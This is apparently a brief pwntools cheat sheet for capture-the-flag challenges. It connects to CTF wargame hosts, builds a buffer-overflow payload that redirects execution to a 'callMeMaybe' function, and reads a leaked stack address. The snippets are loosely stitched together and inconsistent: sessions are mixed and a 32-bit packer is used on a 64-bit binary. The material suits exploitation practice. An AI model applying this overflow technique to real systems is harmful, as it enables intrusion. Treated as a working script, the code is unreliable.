---


---

<p>**from pwn import ***</p>
<h3 id="nc-connect">nc connect</h3>
<p>p = remote(‘ctf.j0n9hyun.xyz’, 3006)<br>
e = ELF(’./64bof_basic’)<br>
callme = e.sym.callMeMaybe</p>
<h3 id="ssh-connect">ssh connect</h3>
<p>ssh = ssh(“unlink”, “<a href="http://pwnable.kr">pwnable.kr</a>”, port = 2222, password = “guest”)<br>
s = ssh.process("/home/unlink/unlink")<br>
e = ELF(’./unlink’)</p>
<h3 id="func-address">func address</h3>
<p>callme = e.sym.callMeMaybe</p>
<h3 id="make-payload">make payload</h3>
<p>payload = ‘’<br>
payload += ‘A’*3<br>
payload += p32(callme)</p>
<h3 id="recv-words">recv words</h3>
<p>s.recvuntil(": ")<br>
StackAdd = int(s.recv(10), 16)</p>
<h3 id="send-words">send words</h3>
<p>s.send(payload)</p>
<h3 id="end">end</h3>
<p>p.interactive()</p>

